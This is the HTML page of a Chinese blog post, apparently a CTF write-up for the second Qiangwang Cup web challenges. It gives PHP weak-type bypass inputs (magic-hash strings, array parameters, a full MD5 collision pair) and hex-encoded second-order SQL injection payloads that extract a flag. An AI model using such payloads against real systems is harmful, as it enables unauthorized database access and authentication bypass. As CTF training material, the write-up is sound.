@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Str3am.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Str3am.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Damion:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://jlkl.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="Web签到提交 param1 ，param2 两个参数，总共三关，考察 php 弱类型，和极客大挑战的题目一样 第一关：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第二届强网杯 Writeup">
+<meta property="og:url" content="https://jlkl.github.io/2018/04/01/Web_05/index.html">
+<meta property="og:site_name" content="Str3am&#39;s Blog">
+<meta property="og:description" content="Web签到提交 param1 ，param2 两个参数，总共三关，考察 php 弱类型，和极客大挑战的题目一样 第一关：">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/lgt35b503cui8a5qsyjgaafe9i.png">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/5pq8utsyqdsiq3xc00d35mpap2.png">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/0szyqitll9lr3clmg97jtfq1tt.png">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/j0mydok06kpm0m5gailch3p9l7.png">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/72x5eade9sy8pewomdvy5w0yq4.png">
+<meta property="article:published_time" content="2018-04-01T03:42:56.000Z">
+<meta property="article:modified_time" content="2020-01-27T09:12:58.349Z">
+<meta property="article:author" content="Str3am">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/lgt35b503cui8a5qsyjgaafe9i.png">
+
+<link rel="canonical" href="https://jlkl.github.io/2018/04/01/Web_05/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>第二届强网杯 Writeup | Str3am's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?fcdffc3f3c9531fca765ea966be04985";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Str3am's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Str3am's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives<span class="badge">32</span></a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jlkl.github.io/2018/04/01/Web_05/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Str3am.jpg">
+      <meta itemprop="name" content="Str3am">
+      <meta itemprop="description" content="这个人很懒，什么也没留下">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Str3am's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          第二届强网杯 Writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-04-01 11:42:56" itemprop="dateCreated datePublished" datetime="2018-04-01T11:42:56+08:00">2018-04-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-01-27 17:12:58" itemprop="dateModified" datetime="2020-01-27T17:12:58+08:00">2020-01-27</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2018/04/01/Web_05/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2018/04/01/Web_05/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              <span>1.5k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              <span>2 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h2><p>提交 param1 ，param2 两个参数，总共三关，考察 php 弱类型，和极客大挑战的题目一样</p>
+<p>第一关：<br><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/lgt35b503cui8a5qsyjgaafe9i.png" alt></p>
+<a id="more"></a>
+<p>标准弱类型，两个0e开头md5绕过：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">param1</span>=QNKCDZO&amp;param2=<span class="number">240610708</span></span><br></pre></td></tr></table></figure>
+<p>或者数组绕过</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">para<span class="name">m1</span>[]=a&amp;para<span class="name">m2</span>[]=b</span><br></pre></td></tr></table></figure>
+
+<p>第二关：<br><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/5pq8utsyqdsiq3xc00d35mpap2.png" alt><br>依旧数组绕过：</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">para<span class="name">m1</span>[]=a&amp;para<span class="name">m2</span>[]=b</span><br></pre></td></tr></table></figure>
+
+<p>第三关：<br><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/0szyqitll9lr3clmg97jtfq1tt.png" alt><br>强制转换成字符串，不能用数组绕过，想到 md5 碰撞，即两个不同的字符串的 md5值相同</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">para<span class="name">m1</span>=<span class="meta">%</span>D<span class="number">11</span><span class="meta">%</span>DD<span class="meta">%</span><span class="number">02</span><span class="meta">%</span>C<span class="number">5</span><span class="meta">%</span>E<span class="number">6</span><span class="meta">%</span>EE<span class="meta">%</span>C<span class="number">4</span>i<span class="meta">%</span><span class="number">3</span>D<span class="meta">%</span><span class="number">9</span>A<span class="meta">%</span><span class="number">06</span><span class="meta">%</span><span class="number">98</span><span class="meta">%</span>AF<span class="meta">%</span>F<span class="number">9</span><span class="meta">%</span><span class="number">5</span>C<span class="meta">%</span><span class="number">2</span>F<span class="meta">%</span>CA<span class="meta">%</span>B<span class="number">5</span><span class="meta">%</span><span class="number">87</span><span class="meta">%</span><span class="number">12</span>F<span class="meta">%</span><span class="number">7</span>E<span class="meta">%</span>AB<span class="meta">%</span><span class="number">40</span><span class="meta">%</span><span class="number">04</span>X<span class="meta">%</span><span class="number">3</span>E<span class="meta">%</span>B<span class="number">8</span><span class="meta">%</span>FB<span class="meta">%</span><span class="number">7</span>F<span class="meta">%</span><span class="number">89</span>U<span class="meta">%</span>AD<span class="number">4</span><span class="meta">%</span><span class="number">06</span><span class="meta">%</span><span class="number">09</span><span class="meta">%</span>F<span class="number">4</span><span class="meta">%</span>B<span class="number">3</span><span class="meta">%</span><span class="number">02</span><span class="meta">%</span><span class="number">83</span><span class="meta">%</span>E<span class="number">4</span><span class="meta">%</span><span class="number">88</span><span class="meta">%</span><span class="number">83</span><span class="meta">%</span><span class="number">25</span>qAZ<span class="meta">%</span><span class="number">08</span>Q<span class="meta">%</span><span class="number">25</span><span class="meta">%</span>E<span class="number">8</span><span class="meta">%</span>F<span class="number">7</span><span class="meta">%</span>CD<span class="meta">%</span>C<span class="number">9</span><span class="meta">%</span><span class="number">9</span>F<span class="meta">%</span>D<span class="number">9</span><span class="meta">%</span><span class="number">1</span>D<span class="meta">%</span>BD<span class="meta">%</span>F<span class="number">2</span><span class="meta">%</span><span class="number">807</span><span class="meta">%</span><span class="number">3</span>C<span class="meta">%</span><span class="number">5</span>B<span class="meta">%</span>D<span class="number">8</span><span class="meta">%</span><span class="number">82</span><span class="meta">%</span><span class="number">3</span>E<span class="number">1</span>V<span class="number">4</span><span class="meta">%</span><span class="number">8</span>F<span class="meta">%</span><span class="number">5</span>B<span class="meta">%</span>AEm<span class="meta">%</span>AC<span class="meta">%</span>D<span class="number">46</span><span class="meta">%</span>C<span class="number">9</span><span class="meta">%</span><span class="number">19</span><span class="meta">%</span>C<span class="number">6</span><span class="meta">%</span>DDS<span class="meta">%</span>E<span class="number">2</span><span class="meta">%</span>B<span class="number">4</span><span class="meta">%</span><span class="number">87</span><span class="meta">%</span>DA<span class="meta">%</span><span class="number">03</span><span class="meta">%</span>FD<span class="meta">%</span><span class="number">029</span>c<span class="meta">%</span><span class="number">06</span><span class="meta">%</span>D<span class="number">2</span>H<span class="meta">%</span>CD<span class="meta">%</span>A<span class="number">0</span><span class="meta">%</span>E<span class="number">9</span><span class="meta">%</span><span class="number">9</span>F<span class="number">3</span>B<span class="meta">%</span><span class="number">0</span>FW<span class="meta">%</span><span class="number">7</span>E<span class="meta">%</span>E<span class="number">8</span><span class="meta">%</span>CET<span class="meta">%</span>B<span class="number">6</span>p<span class="meta">%</span><span class="number">80</span><span class="meta">%</span>A<span class="number">8</span><span class="meta">%</span><span class="number">0</span>D<span class="meta">%</span><span class="number">1</span>E<span class="meta">%</span>C<span class="number">6</span><span class="meta">%</span><span class="number">98</span><span class="meta">%</span><span class="number">21</span><span class="meta">%</span>BC<span class="meta">%</span>B<span class="number">6</span><span class="meta">%</span>A<span class="number">8</span><span class="meta">%</span><span class="number">83</span><span class="meta">%</span><span class="number">93</span><span class="meta">%</span><span class="number">96</span><span class="meta">%</span>F<span class="number">9</span>e<span class="meta">%</span><span class="number">2</span>Bo<span class="meta">%</span>F<span class="number">7</span><span class="meta">%</span><span class="number">2</span>Ap</span><br><span class="line">para<span class="name">m2</span>=<span class="meta">%</span>D<span class="number">11</span><span class="meta">%</span>DD<span class="meta">%</span><span class="number">02</span><span class="meta">%</span>C<span class="number">5</span><span class="meta">%</span>E<span class="number">6</span><span class="meta">%</span>EE<span class="meta">%</span>C<span class="number">4</span>i<span class="meta">%</span><span class="number">3</span>D<span class="meta">%</span><span class="number">9</span>A<span class="meta">%</span><span class="number">06</span><span class="meta">%</span><span class="number">98</span><span class="meta">%</span>AF<span class="meta">%</span>F<span class="number">9</span><span class="meta">%</span><span class="number">5</span>C<span class="meta">%</span><span class="number">2</span>F<span class="meta">%</span>CA<span class="meta">%</span>B<span class="number">5</span><span class="meta">%</span><span class="number">07</span><span class="meta">%</span><span class="number">12</span>F<span class="meta">%</span><span class="number">7</span>E<span class="meta">%</span>AB<span class="meta">%</span><span class="number">40</span><span class="meta">%</span><span class="number">04</span>X<span class="meta">%</span><span class="number">3</span>E<span class="meta">%</span>B<span class="number">8</span><span class="meta">%</span>FB<span class="meta">%</span><span class="number">7</span>F<span class="meta">%</span><span class="number">89</span>U<span class="meta">%</span>AD<span class="number">4</span><span class="meta">%</span><span class="number">06</span><span class="meta">%</span><span class="number">09</span><span class="meta">%</span>F<span class="number">4</span><span class="meta">%</span>B<span class="number">3</span><span class="meta">%</span><span class="number">02</span><span class="meta">%</span><span class="number">83</span><span class="meta">%</span>E<span class="number">4</span><span class="meta">%</span><span class="number">88</span><span class="meta">%</span><span class="number">83</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span>F<span class="number">1</span>AZ<span class="meta">%</span><span class="number">08</span>Q<span class="meta">%</span><span class="number">25</span><span class="meta">%</span>E<span class="number">8</span><span class="meta">%</span>F<span class="number">7</span><span class="meta">%</span>CD<span class="meta">%</span>C<span class="number">9</span><span class="meta">%</span><span class="number">9</span>F<span class="meta">%</span>D<span class="number">9</span><span class="meta">%</span><span class="number">1</span>D<span class="meta">%</span>BDr<span class="meta">%</span><span class="number">807</span><span class="meta">%</span><span class="number">3</span>C<span class="meta">%</span><span class="number">5</span>B<span class="meta">%</span>D<span class="number">8</span><span class="meta">%</span><span class="number">82</span><span class="meta">%</span><span class="number">3</span>E<span class="number">1</span>V<span class="number">4</span><span class="meta">%</span><span class="number">8</span>F<span class="meta">%</span><span class="number">5</span>B<span class="meta">%</span>AEm<span class="meta">%</span>AC<span class="meta">%</span>D<span class="number">46</span><span class="meta">%</span>C<span class="number">9</span><span class="meta">%</span><span class="number">19</span><span class="meta">%</span>C<span class="number">6</span><span class="meta">%</span>DDS<span class="meta">%</span>E<span class="number">24</span><span class="meta">%</span><span class="number">87</span><span class="meta">%</span>DA<span class="meta">%</span><span class="number">03</span><span class="meta">%</span>FD<span class="meta">%</span><span class="number">029</span>c<span class="meta">%</span><span class="number">06</span><span class="meta">%</span>D<span class="number">2</span>H<span class="meta">%</span>CD<span class="meta">%</span>A<span class="number">0</span><span class="meta">%</span>E<span class="number">9</span><span class="meta">%</span><span class="number">9</span>F<span class="number">3</span>B<span class="meta">%</span><span class="number">0</span>FW<span class="meta">%</span><span class="number">7</span>E<span class="meta">%</span>E<span class="number">8</span><span class="meta">%</span>CET<span class="meta">%</span>B<span class="number">6</span>p<span class="meta">%</span><span class="number">80</span><span class="meta">%</span><span class="number">28</span><span class="meta">%</span><span class="number">0</span>D<span class="meta">%</span><span class="number">1</span>E<span class="meta">%</span>C<span class="number">6</span><span class="meta">%</span><span class="number">98</span><span class="meta">%</span><span class="number">21</span><span class="meta">%</span>BC<span class="meta">%</span>B<span class="number">6</span><span class="meta">%</span>A<span class="number">8</span><span class="meta">%</span><span class="number">83</span><span class="meta">%</span><span class="number">93</span><span class="meta">%</span><span class="number">96</span><span class="meta">%</span>F<span class="number">9</span>e<span class="meta">%</span>ABo<span class="meta">%</span>F<span class="number">7</span><span class="meta">%</span><span class="number">2</span>Ap</span><br></pre></td></tr></table></figure>
+<p>具体可以参见这篇文章：<a href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value" target="_blank" rel="noopener">MD5 collision</a><br>二进制块转换成字符串后再 url 编码</p>
+<h2 id="Three-hit"><a href="#Three-hit" class="headerlink" title="Three hit"></a>Three hit</h2><p>二次注入</p>
+<p>注册将用户名，密码，年龄写入数据库，登录过后将年龄显示出来<br>思路：每次注册一个用户，注入点放进age，登录查看</p>
+<p>注册提交age显示只能为数字，age用16进制提交，16进制提交不会对%23url解码，所以用–代替</p>
+<p>payload:<br><code>username=Str3am1&amp;age=0x2d3636363636363636363636363636363636363636363636363620756e696f6e2073656c65637420312c322c332c34206c696d697420312c312d2d&amp;password=1</code><br><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/j0mydok06kpm0m5gailch3p9l7.png" alt></p>
+<p>因为每次都会将年龄写入数据库里面，所以每次都需要修改年龄的值<br><code>username=Str3am11&amp;age=0x2d36363636363636363636363636363636363636363636363620756e696f6e2073656c65637420312c2873656c65637420666c61672066726f6d20666c6167292c332c34206c696d697420312c312d2d&amp;password=1</code><br><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/72x5eade9sy8pewomdvy5w0yq4.png" alt></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>两天比赛，团队总成绩136名，比赛过程很艰辛，但是收获颇丰，遗憾的是只做出了两道题，还是太菜了，以后坚持赛后写wp，对自己也是一种锻炼。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Str3am
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://jlkl.github.io/2018/04/01/Web_05/" title="第二届强网杯 Writeup">https://jlkl.github.io/2018/04/01/Web_05/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/02/20/Web_04/" rel="prev" title="HGAME 2018 Web Week2 Random?">
+      <i class="fa fa-chevron-left"></i> HGAME 2018 Web Week2 Random?
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/04/06/Film_01/" rel="next" title="[影评] 头号玩家">
+      [影评] 头号玩家 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web签到"><span class="nav-number">1.</span> <span class="nav-text">Web签到</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Three-hit"><span class="nav-number">2.</span> <span class="nav-text">Three hit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Str3am"
+      src="/images/Str3am.jpg">
+  <p class="site-author-name" itemprop="name">Str3am</p>
+  <div class="site-description" itemprop="description">这个人很懒，什么也没留下</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/jlkl" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;jlkl" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:str3am@qq.com" title="E-Mail → mailto:str3am@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Friends
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://0xmj.github.io/" title="http:&#x2F;&#x2F;0xmj.github.io&#x2F;" rel="noopener" target="_blank">Mang0</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/sn1per/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;sn1per&#x2F;" rel="noopener" target="_blank">Sn1per</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Str3am</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="Symbols count total">218k</span>
+</div> 
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment-precise-range-plugin@1.3.0/moment-precise-range.min.js"></script>
+<script>
+  function timer() {
+    var ages = moment.preciseDiff(moment(),moment(20200108,"YYYYMMDD"));
+    ages = ages.replace(/years?/, "年");
+    ages = ages.replace(/months?/, "月");
+    ages = ages.replace(/days?/, "天");
+    ages = ages.replace(/hours?/, "小时");
+    ages = ages.replace(/minutes?/, "分");
+    ages = ages.replace(/seconds?/, "秒");
+    ages = ages.replace(/\d+/g, '<span style="color:#1890ff">$&</span>');
+    div.innerHTML = `我已在此等候你 ${ages}`;
+  }
+  var div = document.createElement("div");
+  //插入到copyright之后
+  var copyright = document.querySelector(".copyright");
+  document.querySelector(".footer-inner").insertBefore(div, copyright.nextSibling);
+  timer();
+  setInterval("timer()",1000)
+</script>
+
+
+
+
+  <script async src="/js/cursor/love.min.js"></script>
+
+
+
+
+  <script src="/js/cursor/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-user"></i>
+        </span>
+        <span class="site-uv" title="我的第  undefined  位朋友，">
+          <span id="busuanzi_value_site_uv"></span>
+        </span>
+      -->
+      <span class="site-uv">
+     我的第  <span style="margin:0 5px;" class="busuanzi-value" id="busuanzi_value_site_uv"></span>  位朋友，
+    </span>
+    <!--
+      <span class="post-meta-divider">|</span>
+    -->
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-eye"></i>
+        </span>
+        <span class="site-pv" title="历经  undefined  次回眸才与你相遇">
+          <span id="busuanzi_value_site_pv"></span>
+        </span>
+      -->
+      <span class="site-pv">
+     历经  <span style="margin:0 5px;" class="busuanzi-value" id="busuanzi_value_site_pv"></span>  次回眸才与你相遇
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el: '#valine-comments',
+      verify: true,
+      notify: true,
+      appId: '3IVY8n0VhhMlAUHBsp34Pxx7-gzGzoHsz',
+      appKey: 'DjdjX2sAzBG2G1G5c6amlBnv',
+      placeholder: "Just go go",
+      avatar: 'mm',
+      meta: guest,
+      pageSize: '10' || 10,
+      visitor: false,
+      lang: 'en' || 'zh-cn',
+      path: location.pathname,
+      recordIP: true,
+      serverURLs: ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
